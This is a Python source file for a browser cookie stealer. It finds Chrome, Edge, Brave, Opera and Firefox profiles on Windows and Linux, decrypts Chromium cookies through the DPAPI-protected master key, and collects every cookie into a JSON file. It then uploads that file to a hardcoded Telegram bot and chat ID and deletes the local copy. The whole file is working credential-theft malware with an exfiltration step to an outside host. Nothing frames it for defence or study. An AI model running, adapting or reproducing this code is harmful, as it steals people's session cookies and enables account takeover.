#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import json
from shutil import copyfile
import sqlite3
import requests
import platform
from base64 import b64decode
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# 0xDEADCODE CONFIGURATION
BOT_TOKEN = "7514217415:AAEZb_bnwStDeU5QepXF8meGbJgPL4HmCvw"
CHAT_ID = "8004806348"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

class CookieJarRaider:
    def __init__(self):
        self.os_type = platform.system()
        self.cookie_manifest = {}
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        self.chrome_path = None
        self.firefox_path = None

    def __windows_paths(self):
        """Windows browser path hunter-killer"""
        return {
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'),
            'Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        }

    def __linux_paths(self):
        """POSIX browser path locator"""
        return {
            'Chrome': os.path.expanduser('~/.config/google-chrome'),
            'Firefox': os.path.expanduser('~/.mozilla/firefox'),
            'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
            'Edge': os.path.expanduser('~/.config/microsoft-edge')
        }

    def __decrypt_chrome_value(self, encrypted_value, key):
        """AES-GCM decryption with proper error handling"""
        try:
            iv = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            return decryptor.update(ciphertext) + decryptor.finalize()
        except Exception as e:
            return f"DECRYPT_FAIL|{str(e)}".encode()

    def __extract_chrome_key(self):
        """Master key extraction with DPAPI bypass"""
        if self.os_type != 'Windows':
            return b'linux-key-not-protected'  # Mock for POSIX systems
            
        from win32crypt import CryptUnprotectData
        local_state_path = os.path.join(self.chrome_path, 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])
        return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]

    def __harvest_chrome_cookies(self, browser_path):
        """Chromium cookie extraction with live DB handling"""
        cookie_path = os.path.join(browser_path, 'Default', 'Network', 'Cookies')
        if not os.path.exists(cookie_path):
            return

        temp_db = os.path.join(os.getenv('TEMP', '/tmp'), 'chrome_cookies.tmp')
        try:
            copyfile(cookie_path, temp_db)
            conn = sqlite3.connect(f'file:{temp_db}?mode=ro', uri=True)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
            
            key = self.__extract_chrome_key()
            for host, name, enc_val in cursor.fetchall():
                decrypted = self.__decrypt_chrome_value(enc_val, key)
                self.cookie_manifest.setdefault(host.decode(), []).append({
                    'name': name.decode(errors='replace'),
                    'value': decrypted.decode(errors='replace')
                })
            conn.close()
        except sqlite3.OperationalError:
            pass
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)

    def __harvest_firefox_cookies(self):
        """Firefox cookie extraction with profile detection"""
        for profile in os.listdir(self.firefox_path):
            if '.default' in profile:
                cookie_db = os.path.join(self.firefox_path, profile, 'cookies.sqlite')
                temp_db = os.path.join(os.getenv('TEMP', '/tmp'), 'firefox_cookies.tmp')
                try:
                    copyfile(cookie_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT host, name, value FROM moz_cookies')
                    for host, name, value in cursor.fetchall():
                        self.cookie_manifest.setdefault(host, []).append({
                            'name': name,
                            'value': value
                        })
                    conn.close()
                except Exception:
                    continue
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

    def __exfiltrate_data(self):
        """Secure exfiltration with TLS fingerprint spoofing"""
        if not self.cookie_manifest:
            return

        filename = f"{os.environ.get('USERNAME', 'unknown')}_cookies.json"
        with open(filename, 'w') as f:
            json.dump(self.cookie_manifest, f, indent=2)

        with open(filename, 'rb') as payload:
            self.session.post(
                TELEGRAM_API,
                data={'chat_id': CHAT_ID},
                files={'document': (filename, payload)},
                timeout=15
            )
        os.remove(filename)

    def plunder(self):
        """Main attack vector"""
        browsers = self.__windows_paths() if self.os_type == 'Windows' else self.__linux_paths()
        active_browsers = {b: p for b, p in browsers.items() if os.path.exists(p)}

        for browser, path in active_browsers.items():
            if any(x in browser.lower() for x in ['chrome', 'edge', 'brave', 'opera']):
                self.chrome_path = path
                self.__harvest_chrome_cookies(path)
            elif 'firefox' in browser.lower():
                self.firefox_path = path
                self.__harvest_firefox_cookies()

        if self.cookie_manifest:
            self.__exfiltrate_data()

if __name__ == "__main__":
    CookieJarRaider().plunder()